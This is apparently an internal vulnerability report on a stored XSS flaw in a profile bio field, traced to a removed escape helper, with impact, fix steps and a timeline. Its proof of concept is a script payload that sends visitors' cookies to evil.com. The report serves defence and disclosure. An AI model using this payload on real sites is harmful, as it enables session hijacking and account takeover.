title: XSS vulnerability in user profile bio field — unsanitized HTML rendered
description:
## Security Vulnerability Report

**Severity:** Critical  
**Reported by:** Security Audit Team  
**CVE:** Pending assignment

### Summary
The user profile bio field allows arbitrary HTML injection that is rendered unescaped in the activity feed and on public profile pages. This is a stored XSS vulnerability.

### Proof of Concept
Setting bio to: `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`

Visiting the profile page executes the script in visitor browsers.

### Impact
- Session hijacking for any user who views the malicious profile
- Account takeover via stolen session cookies
- Affects all users on public profiles (potentially thousands)

### Root Cause
The bio field was recently updated to support 'rich text' (PR !2045). The sanitizer was applied on input but not on render. Template change in `views/profile/_bio.html.haml` removed the `h()` escape helper.

### Recommended Fix
1. Immediately disable rich text rendering on bio field
2. Re-apply HTML escaping on render path
3. Audit all other user-controlled fields for similar issues
4. Invalidate all active sessions as precaution

### Timeline
- 2026-06-26 18:00 — Vulnerability introduced via PR !2045
- 2026-06-27 08:30 — Identified during internal security scan
- 2026-06-27 09:00 — Reported to security team
- 2026-06-27 09:15 — Issue created (CONFIDENTIAL)
